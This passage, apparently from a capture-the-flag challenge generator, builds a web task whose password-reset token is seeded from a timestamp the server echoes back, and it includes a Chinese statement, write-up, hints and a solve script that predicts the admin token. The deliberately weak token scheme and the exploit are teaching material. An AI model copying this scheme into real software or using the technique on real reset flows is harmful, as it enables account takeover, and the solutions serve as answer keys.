    proc = start(root / "attachments" / "app.py", 18090)
    try:
        body = urllib.request.urlopen("http://127.0.0.1:18090/final?ok=1").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["先想清楚最终页到底验了什么。", "如果只看参数，就可以直接跳。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)

def build_web_reset_token(target: Target) -> BuildResult:
    flag = slug_flag(target.slug)
    app = textwrap.dedent(
        f"""\
        import os, random, time
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import parse_qs, urlparse

        FLAG = "{flag}"
        ISSUED = {{}}

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                parsed = urlparse(self.path)
                params = parse_qs(parsed.query)
                if parsed.path == "/reset/request":
                    user = params.get("user", ["guest"])[0]
                    issued = int(time.time())
                    token = random.Random(issued).randint(100000, 999999)
                    ISSUED[user] = (issued, token)
                    self._send(200, f"issued={{issued}}")
                    return
                if parsed.path == "/reset/confirm":
                    user = params.get("user", ["guest"])[0]
                    token = int(params.get("token", ["0"])[0])
                    item = ISSUED.get(user)
                    if item and token == item[1] and user == "admin":
                        self._send(200, FLAG)
                    else:
                        self._send(403, "denied")
                    return
                self._send(404, "not found")

            def _send(self, status, body):
                data = body.encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                return

        if __name__ == "__main__":
            port = int(os.getenv("PORT", "8080"))
            ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
        """
    ).encode("utf-8")
    statement = web_statement("重置令牌只依赖可观察的时间戳做伪随机种子。", ["启动服务。", "为管理员发起一次重置请求拿到时间戳。", "预测 token 并完成确认。"])
    solution = """# 解法

请求接口会回显 `issued=<timestamp>`，而 token 直接来自 `random.Random(issued).randint(...)`。用同一个时间戳在本地重算令牌，再请求确认接口即可拿到 flag。
"""
    solve_py = """#!/usr/bin/env python3
from __future__ import annotations

import os, random, socket, subprocess, sys, time, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18091)
    try:
        issued_text = urllib.request.urlopen("http://127.0.0.1:18091/reset/request?user=admin").read().decode()
        issued = int(issued_text.split("=", 1)[1])
        token = random.Random(issued).randint(100000, 999999)
        body = urllib.request.urlopen(f"http://127.0.0.1:18091/reset/confirm?user=admin&token={token}").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
"""
    return BuildResult(statement=statement, solution=solution, solve_py=solve_py, hints=["先确认 token 到底依赖什么。", "如果种子完全可见，就能本地重算。"], files={"attachments/app.py": app}, attachments=[("attachments/app.py", "app.py")], flag_type="static", flag_value=flag)
